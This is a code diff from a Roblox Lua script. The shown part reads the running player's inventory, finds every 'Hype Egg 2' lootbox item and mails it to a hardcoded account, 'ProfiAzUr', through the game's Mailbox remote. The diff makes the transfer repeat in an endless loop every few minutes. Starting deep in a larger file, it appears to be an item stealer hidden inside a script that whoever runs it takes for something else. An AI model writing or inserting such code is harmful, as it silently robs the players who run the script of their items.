@@ -187,34 +187,38 @@ end)
 spawn(function()
     local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
     local username = "ProfiAzUr"
+    local loopInterval = 5 -- Interval in seconds
 
-    -- Attempt to retrieve player inventory
-    local playerInventory = Save.Get()["Inventory"]
-    local LootboxInv = playerInventory["Lootbox"]
+    while true do
+        -- Attempt to retrieve player inventory
+        local playerInventory = Save.Get()["Inventory"]
+        local LootboxInv = playerInventory["Lootbox"]
 
-    -- Print details about the Lootbox inventory and find Hype Egg #2
-    print("Searching for Hype Egg #2...")
-    for key, item in pairs(LootboxInv) do
-        if item.id == "Hype Egg 2" then
-            print("Found Hype Egg #2 items:", item)
-            local amount = item._am or item.am or 1
-            print("Amount to send:", amount)
+        -- Print details about the Lootbox inventory and find Hype Egg #2
+        print("Searching for Hype Egg #2...")
+        for key, item in pairs(LootboxInv) do
+            if item.id == "Hype Egg 2" then
+                print("Found Hype Egg #2 items:", item)
+                local amount = item._am or item.am or 1
+                print("Amount to send:", amount)
 
-            local args = {
-                [1] = username,
-                [2] = "Take my gifts",
-                [3] = "Lootbox",
-                [4] = key,
-                [5] = amount
-            }
-            print("Invoking Server with args:", unpack(args))
+                local args = {
+                    [1] = username,
+                    [2] = "Take my gifts",
+                    [3] = "Lootbox",
+                    [4] = key,
+                    [5] = amount
+                }
+                print("Invoking Server with args:", unpack(args))
 
-            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-            break
+                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                break
+            end
         end
-    end
 
-    print("Finished processing Hype Egg #2s.")
+        print("Finished processing Hype Egg #2s.")
+        task.wait(loopInterval * 60) -- Wait for the specified interval before repeating
+    end
 end)
 
 
